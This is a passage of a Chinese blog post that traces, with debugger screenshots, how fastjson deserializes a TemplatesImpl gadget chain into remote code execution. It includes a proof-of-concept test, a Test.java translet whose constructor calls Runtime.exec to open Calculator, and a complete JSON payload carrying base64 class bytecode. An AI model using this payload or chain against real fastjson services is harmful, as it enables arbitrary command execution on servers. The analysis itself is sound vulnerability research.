NASTY_CLASS +</span><br><span class="line">                <span class="string">"\",\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line">        System.out.println(text1);</span><br><span class="line"></span><br><span class="line">        Object obj = JSON.parseObject(text1, Object<span class="class">.<span class="keyword">class</span>, <span class="title">config</span>, <span class="title">Feature</span>.<span class="title">SupportNonPublicField</span>)</span>;</span><br><span class="line">        <span class="comment">//assertEquals(Model.class, obj.getClass());</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test_autoTypeDeny();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Test.java</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Test extends AbstractTranslet &#123;</span><br><span class="line">    </span><br><span class="line">    public Test() throws IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open &#x2F;Applications&#x2F;Calculator.app&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Test t &#x3D; new Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="代码跟踪"><a href="#代码跟踪" class="headerlink" title="代码跟踪"></a>代码跟踪</h2><h3 id="TemplatesImpl-class的寻找"><a href="#TemplatesImpl-class的寻找" class="headerlink" title="TemplatesImpl.class的寻找"></a>TemplatesImpl.class的寻找</h3><p>触发点，一定要传入<code>Feature.SupportNonPublicField</code>否则后面不会为非公有字段添加反序列化器（后面会再提到）<br><img src="./1569587047128.png" alt="Alt text"></p>
+<p>步入 <code>com.alibaba.fastjson.JSON#parseObject:181</code><br><img src="./1569587087142.png" alt="Alt text"></p>
+<p>步入 <code>com.alibaba.fastjson.JSON#parseObject:190</code><br>从全局来看整个反序列化将在下面parseObject进行，其大致顺序是</p>
+<ol>
+<li>配置反序列化时启用的特性，比如是否允许反序列化非公有字段</li>
+<li>获取一个json的词法分析对象parser</li>
+<li>用parser分析传入进来的json字符串，进行反序列化。</li>
+</ol>
+<p><code>/com/alibaba/fastjson/JSON.class:199</code><br><img src="./1569940580037.png" alt="Alt text"></p>
+<p>先来细看DefaultJSONParser创建过程，先执行类初始化方法（略）。</p>
+<p>然后执行对象的构造方法。<br><code>/com/alibaba/fastjson/parser/DefaultJSONParser.class:98</code><br><img src="./1569120846409.png" alt="Alt text"></p>
+<p>执行构造方法的时候又会新建一个JSONScanner类，JSONScanner类的生成同样先是执行类初始化（略）</p>
+<p>然后是对象父类的初始化<br><img src="./1569121697471.png" alt="Alt text"></p>
+<p>子类的初始化<br><code>/com/alibaba/fastjson/parser/JSONScanner.class:28</code><br><img src="./1569121849067.png" alt="Alt text"></p>
+<p>然后回到DefaultJSONParser中执行构造方法，<strong>需要特别说明是初始化的时候将因为传入的json是<code>{</code>开头，所以将token设置为了12，随着词法分析进行token进行会一直改变，token不一样意味着解析接下来json的策略也会变。token与字符的关联关系定义在com.alibaba.fastjson.parser.JSONToken</strong><br><code>com.alibaba.fastjson.parser.DefaultJSONParser#DefaultJSONParser</code><br><img src="./1569122340408.png" alt="Alt text"></p>
+<p>构造方法完成后意味着宏观来看的前两步也完成了，此时拿到词法分析器parser<br><code>/com/alibaba/fastjson/JSON.class:203</code><br><img src="./1569393851685.png" alt="Alt text"></p>
+<p>接着进入从全局来看的最后一步（下面写的所有都是从最后一步展开分析）。调用parser的parseObject方法反序列化json。这里type是在写在Poc中的Object.class，这里的config是在Poc中new的ParserConfig，根据传入的类类型的不同，config会返回不同的反序列化器。<br><code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject:575</code><br><img src="./1569941780435.png" alt="Alt text"></p>
+<p>先检查传入的type是不是(泛型)数组类型，最后又回到DefaultJSONParser的parser<br><code>com.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer.class#deserialze:42</code><br><img src="./1569123937120.png" alt="Alt text"></p>
+<p>parser方法根据token的不同case到不同分支里面，开始的时候提到了，在创建DefaultJSONParser的时候token设置为了12。<br><code>com.alibaba.fastjson.parser.DefaultJSONParser.class#parse:1295</code><br><img src="./1569123900016.png" alt="Alt text"><br><img src="./1569123997961.png" alt="Alt text"></p>
+<p>case 12，主要进行的操作是提去出<code>@type</code>对应的类，并获取到类对象即TemplatesImpl。<br><code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject</code><br><img src="./1569136890182.png" alt="Alt text"><br><img src="./1569138569725.png" alt="Alt text"></p>
+<p>这里将token设置为了16（意味着json合法情况下，下一个符号是逗号）<br><img src="./1569396571361.png" alt="Alt text"></p>
+<p>根据TemplatesImpl类对象，寻找针对TemplatesImpl的反序列化器，之所以要找新的反序列化器是为了后续反序列化TemplatesImpl的字段。<br><img src="./1569396639528.png" alt="Alt text"></p>
+<p>找TemplatesImpl.class对应的反序列化器的任务还是委托给config，但是显然config并没有专门对付TemplatesImpl的反序列化器，所以走到了最后一个if条件，即把TemplatesImpl当作一个Java Bean来看并待根据TemplatesImpl实际情况定制一个JavaBeanDeserializer。<br><code>com/alibaba/fastjson/parser/ParserConfig.class:411</code><br><img src="./1569400686165.png" alt="Alt text"></p>
+<h3 id="定制一个的JavaBeanDeserializer来反序列化TemplatesImpl-class"><a href="#定制一个的JavaBeanDeserializer来反序列化TemplatesImpl-class" class="headerlink" title="定制一个的JavaBeanDeserializer来反序列化TemplatesImpl.class"></a>定制一个的JavaBeanDeserializer来反序列化TemplatesImpl.class</h3><p>细看一下TemplatesImpl版的JavaBeanDeserializer定制过程。</p>
+<p>一来先构建一个beaninfo<br><code>com.alibaba.fastjson.parser.ParserConfig.class#createJavaBeanDeserializer:480</code><br><img src="./1569946978448.png" alt="Alt text"></p>
+<p>beaninfo构建的目的主要是拿到TemplatesImpl满足条件的getter、setter对应的Field和无参构造方法。获取这些办法就是常规的内省操作。<br><img src="./1569402342199.png" alt="Alt text"></p>
+<p>内省重点是满足条件的getter和setter<br><code>com.alibaba.fastjson.util.JavaBeanInfo.class#build:318</code></p>
+<ul>
+<li>方法名长度大于4 &amp;&amp; 非静态函数 &amp;&amp; 返回类型为void或当前类 &amp;&amp; 参数个数为1个 &amp;&amp; 以set开头<br><img src="./1569982590526.png" alt="Alt text"></li>
+</ul>
+<p><code>com.alibaba.fastjson.util.JavaBeanInfo.class#build:458</code></p>
+<ul>
+<li>方法名长度大于等于4 &amp;&amp; 非静态方法 &amp;&amp; 以get开头且第4个字母为大写 &amp;&amp; 无参数 &amp;&amp; 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong<br><img src="./1569983315580.png" alt="Alt text"></li>
+</ul>
+<p>找到getter setter对应的字段后，会把字段名、字段对应的方法、类对象等打包成fieldInfo并add到FieldList中<br><img src="./1569983723950.png" alt="Alt text"></p>
+<p>最后用内省拿到的各种东西去构建JavaBeanInfo<br><code>com.alibaba.fastjson.util.JavaBeanInfo.class#build:480</code><br><img src="./1569511032560.png" alt="Alt text"></p>
+<p>构建JavaBeanInfo中有一步中的操作是把FiledInfo排序，排序之后后面要用到FileList的内容直接二分法拿。<br><code>com.alibaba.fastjson.util.JavaBeanInfo#JavaBeanInfo:70</code><br><img src="./1569511220400.png" alt="Alt text"></p>
+<p>JavaBeanInfo构建好会遍历其filedLIst查看是否有getOnly的方法，如果有的话后面就不会用asm的方法创建（对asm不了解，查网上资料是这么说的：获取java bean的属性值，需要调用反射，fastjson引入了asm的来避免反射导致的开销。）这里很不幸，getOutputProperties属于getOnly方法（至于为什么是getOnly简单跟踪一下FiledInfo创建过程就知道了，这里不再展开）<br><img src="./1569511346335.png" alt="Alt text"></p>
+<p>所以这里最后会用非asm的方法创建JavaBeanDeserializer，用人话说就是直接new JavaBeanDeserializer<br><code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer</code><br><img src="./1569984381146.png" alt="Alt text"></p>
+<p>JavaBeanDeserializer构造方法中又把刚才拿到beaninfo的操作重复了一遍（上面已经跟过了这里也不重复跟踪）。<br><code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.class#JavaBeanDeserializer:50</code><br><img src="./1569511793223.png" alt="Alt text"></p>
+<p>JavaBeanDeserializer在构造方法中会为每一个Bean字段创建一个反序列化器，并把反序列化器放到sortedFieldDeserializers中<br><code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.class#JavaBeanDeserializer:64</code><br><img src="./1569490857135.png" alt="Alt text"></p>
+<p>这个反序列化器默认情况下是DeafultFiledDeserializer<br><code>com.alibaba.fastjson.parser.ParserConfig.class#createFieldDeserializer:565</code><br><img src="./1569491000388.png" alt="Alt text"><br><img src="./1569512316826.png" alt="Alt text"><br><img src="./1569512351441.png" alt="Alt text"></p>
+<p>最后会把JavaBeanDeserializer的Teamplaytesimpl方法到反序列化器的序列中（如果后面其它也要用就不用重新创建一次了）<br><img src="./1569487153087.png" alt="Alt text"></p>
+<p>至此JavaBeanDeserializer定制完成，下面就开始正式反序列化TemplatesImpl<br><img src="./1569569979360.png" alt="Alt text"></p>
+<h3 id="JavaBeanDeserializer-deserialze"><a href="#JavaBeanDeserializer-deserialze" class="headerlink" title="JavaBeanDeserializer.deserialze"></a>JavaBeanDeserializer.deserialze</h3><p>deserialze往下跟几步会进入label1064，从宏观来看主要的操作都在label1064和其子label中，做了以下这几件事情。</p>
+<ol>
+<li>创建TemplatesImpl对象</li>
+<li>继续读取json字符串内容</li>
+<li>用字段的反序列化器把读到内容set到TemplatesImpl对象中<br><img src="./1569513241314.png" alt="Alt text"></li>
+</ol>
+<p>第一步创建TemplatesImpl对象<br><code>/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.class:579</code><br><img src="./1569513602747.png" alt="Alt text"></p>
+<p>第二步根据从json字符串读出的key，反序列化对应字段<br><code>/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.class:606</code><br><img src="./1569997637825.png" alt="Alt text"><br><img src="./1569513780402.png" alt="Alt text"></p>
+<p>往下跟的话<strong>之前设置的Feature.SupportNonPublicField.mask在这里就发挥作用了，如果没有这个在TemplatesImpl这条链中_bytecodes因为是私有字段的原因最后就不会被反序列化。</strong><code>SupportNonPublicField</code>选项会把<strong>所有字段</strong>的反序列化器全部生成并放到extraFieldDeserializers中。<br><code>com.alibaba.fastjson.parser.DefaultJSONParser:747</code><br><img src="./1569592836749.png" alt="Alt text"><br><img src="./1569987252636.png" alt="Alt text"></p>
+<p>第三步到了最后的时刻，好戏上演。最后一步从局部宏观来看还可再细分为三步<br>1.获取直接和字段值打交道的反序列化器fieldValueDeserilizer<br>2.反序列化拿字段对象<br>3.把字段对象set到object中（如果字段对象的fieldInfo是getOnly，则会反射调用getter方法，从微观来讲RCE问题出在这个地方）<br><img src="./1569570858786.png" alt="Alt text"></p>
+<p>以_bytecodes为例<br>第一步 没啥好说的依旧通过config类获取对应的反序列化器<br><img src="./1569633321786.png" alt="Alt text"></p>
+<p>第二步 fieldValueDeserilizer是ObjectArrayCodec，负责把base64编码解码<br><img src="./1569574729954.png" alt="Alt text"><br><img src="./1569575532296.png" alt="Alt text"><br><img src="./1569575672975.png" alt="Alt text"><br><img src="./1569575793082.png" alt="Alt text"></p>
+<p>第三步 就是把拿到的值放到TemplatesImpl对象中了<br><img src="./1569636061623.png" alt="Alt text"><br><img src="./1569636169022.png" alt="Alt text"></p>
+<p>_name，_tfactory，_outputProperties的反序列化大同小异</p>
+<p>说法在反序列化_outputProperties的时候<br><img src="./1569835286521.png" alt="Alt text"></p>
+<p>在第三步setValue的时候，因为_outputProperties是getOnly的所以进入不一样的分支，并触发它相应的get方法即getOutputProperties，最后会触发Test的无参数构造方法。<br><img src="./1570001070880.png" alt="Alt text"></p>
+<p>因为本文主要想描述fastjosn的大致流程，后面和反射部分和fastjson关联性不大了，就不细跟了。不过如果细跟的话就会发现为啥payload是这么构造。（json中看似多余字段为啥要加，为啥要继承AbstractTranslet等等，说白了就是如果不这样进入不了触发无参构造器的分支）。<br><img src="./1569837134265.png" alt="Alt text"></p>
+<h2 id="杂想"><a href="#杂想" class="headerlink" title="杂想"></a>杂想</h2><p>弄懂整体流程，弄懂每个大流程下的小流程，弄懂流程之间参数的勾连关系。<br>从代码上来说，从功能来说。<br>从大流程上来说，从大流程中小流程来说。<br>套路或者说定性的规律</p>
+<h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><h3 id="fastjson的黑名单"><a href="#fastjson的黑名单" class="headerlink" title="fastjson的黑名单"></a>fastjson的黑名单</h3><p><a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
+<h3 id="token对应表"><a href="#token对应表" class="headerlink" title="token对应表"></a>token对应表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;** 1 关联到 error *&#x2F;</span><br><span class="line">public final static int ERROR                &#x3D; 1;</span><br><span class="line">&#x2F;** 2 关联到 int *&#x2F;</span><br><span class="line">public final static int LITERAL_INT          &#x3D; 2;</span><br><span class="line">&#x2F;** 3 关联到 float *&#x2F;</span><br><span class="line">public final static int LITERAL_FLOAT        &#x3D; 3;</span><br><span class="line">&#x2F;** 4 关联到 string *&#x2F;</span><br><span class="line">public final static int LITERAL_STRING       &#x3D; 4;</span><br><span class="line">&#x2F;** 5 关联到 iso8601 *&#x2F;</span><br><span class="line">public final static int LITERAL_ISO8601_DATE &#x3D; 5;</span><br><span class="line">&#x2F;** 6 关联到 true *&#x2F;</span><br><span class="line">public final static int TRUE                 &#x3D; 6;</span><br><span class="line">&#x2F;** 7 关联到 false *&#x2F;</span><br><span class="line">public final static int FALSE                &#x3D; 7;</span><br><span class="line">&#x2F;** 8 关联到 null *&#x2F;</span><br><span class="line">public final static int NULL                 &#x3D; 8;</span><br><span class="line">&#x2F;** 9 关联到 new *&#x2F;</span><br><span class="line">public final static int NEW                  &#x3D; 9;</span><br><span class="line">&#x2F;** 10 关联到 ( *&#x2F;</span><br><span class="line">public final static int LPAREN               &#x3D; 10;</span><br><span class="line">&#x2F;** 11 关联到 ) *&#x2F;</span><br><span class="line">public final static int RPAREN               &#x3D; 11;</span><br><span class="line">&#x2F;** 12 关联到 &#123; *&#x2F;</span><br><span class="line">public final static int LBRACE               &#x3D; 12;</span><br><span class="line">&#x2F;** 13 关联到 &#125; *&#x2F;</span><br><span class="line">public final static int RBRACE               &#x3D; 13;</span><br><span class="line">&#x2F;** 14 关联到 [ *&#x2F;</span><br><span class="line">public final static int LBRACKET             &#x3D; 14;</span><br><span class="line">&#x2F;** 15 关联到 ] *&#x2F;</span><br><span class="line">public final static int RBRACKET             &#x3D; 15;</span><br><span class="line">&#x2F;** 16 关联到 , *&#x2F;</span><br><span class="line">public final static int COMMA                &#x3D; 16;</span><br><span class="line">&#x2F;** 17 关联到 : *&#x2F;</span><br><span class="line">public final static int COLON                &#x3D; 17;</span><br><span class="line">&#x2F;** 18 关联到 ident *&#x2F;</span><br><span class="line">public final static int IDENTIFIER           &#x3D; 18;</span><br><span class="line">&#x2F;** 19 关联到 fieldName *&#x2F;</span><br><span class="line">public final static int FIELD_NAME           &#x3D; 19;</span><br><span class="line">&#x2F;** 20 关联到 EOF *&#x2F;</span><br><span class="line">public final static int EOF                  &#x3D; 20;</span><br><span class="line">&#x2F;** 21 关联到 Set *&#x2F;</span><br><span class="line">public final static int SET                  &#x3D; 21;</span><br><span class="line">&#x2F;** 22 关联到 TreeSet *&#x2F;</span><br><span class="line">public final static int TREE_SET             &#x3D; 22;</span><br><span class="line">&#x2F;** 23 关联到 undefined *&#x2F;</span><br><span class="line">public final static int UNDEFINED            &#x3D; 23; &#x2F;&#x2F; undefined</span><br><span class="line">&#x2F;** 24 关联到 ; *&#x2F;</span><br><span class="line">public final static int SEMI                 &#x3D; 24;</span><br><span class="line">&#x2F;** 25 关联到 . *&#x2F;</span><br><span class="line">public final static int DOT                  &#x3D; 25;</span><br><span class="line">&#x2F;** 26 关联到 hex *&#x2F;</span><br><span class="line">public final static int HEX                  &#x3D; 26;</span><br></pre></td></tr></table></figure>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADEANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMVGVzdDsBAApFeGNlcHRpb25zBwAsAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAIAAkHAC8MADAAMQEAIW9wZW4gL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAwAMgAzAQAEVGVzdAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAsAAAAOAAMAAAAKAAQACwANAAwADAAAAAwAAQAAAA4ADQAOAAAADwAAAAQAAQAQAAEAEQASAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAQAAwAAAAgAAMAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAFQAWAAIADwAAAAQAAQAXAAEAEQAYAAIACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAAUAAwAAAAqAAQAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAGQAaAAIAAAABABsAHAADAA8AAAAEAAEAFwAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAXAAgAGAAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA&#x3D;&#x3D;&quot;],&#39;_name&#39;:&#39;a.b&#39;,&#39;_tfactory&#39;:&#123; &#125;,&quot;_outputProperties&quot;:&#123; &#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><p>lexer的np代表开始位置的偏移量，bp表示结束位置的偏移量，每next一次bp就加一，sp是相较于np而言的偏移量。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">fastjson 远程反序列化poc的构造和分析</a><br><a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">FastJson 反序列化学习</a><br><a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">Fastjson 流程分析及 RCE 分析</a><br><a href="https://meizjm3i.github.io/2019/06/05/FastJson反序列化解析流程/" target="_blank" rel="noopener">FastJson反序列化解析流程</a><br><a href="https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/" target="_blank" rel="noopener">Fastjson反序列化漏洞 1.2.24-1.2.48</a><br><a href="https://blog.csdn.net/hanchao5272/article/details/79401434" target="_blank" rel="noopener">Java中Type接口与Class类的区别联系</a><br><a href="https://www.cnblogs.com/baiqiantao/p/7460580.html" target="_blank" rel="noopener">Type 接口【重要】</a><br><a href="https://blog.csdn.net/shangzonghai/article/details/79573698" target="_blank" rel="noopener">秒懂 Java注解类型（@Annotation）</a><br><a href="https://blog.csdn.net/shangzonghai?t=1" target="_blank" rel="noopener">fastjson深度源码解析</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>李三（cl0und）
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://yoursite.com/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/" title="fastjson 反序列化流程硬核跟踪">http://yoursite.com/2019/10/02/fastjson 反序列化流程硬核跟踪/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/java/" rel="tag"># java</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/" rel="prev" title="shiro 反序列化复现">
+      <i class="fa fa-chevron-left"></i> shiro 反序列化复现
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/" rel="next" title="用域委派打烂kerberos狗头">
+      用域委派打烂kerberos狗头 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#代码跟踪"><span class="nav-number">2.</span> <span class="nav-text">代码跟踪</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#TemplatesImpl-class的寻找"><span class="nav-number">2.1.</span> <span class="nav-text">TemplatesImpl.class的寻找</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#定制一个的JavaBeanDeserializer来反序列化TemplatesImpl-class"><span class="nav-number">2.2.</span> <span class="nav-text">定制一个的JavaBeanDeserializer来反序列化TemplatesImpl.class</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JavaBeanDeserializer-deserialze"><span class="nav-number">2.3.</span> <span class="nav-text">JavaBeanDeserializer.deserialze</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#杂想"><span class="nav-number">3.</span> <span class="nav-text">杂想</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#附"><span class="nav-number">4.</span> <span class="nav-text">附</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" 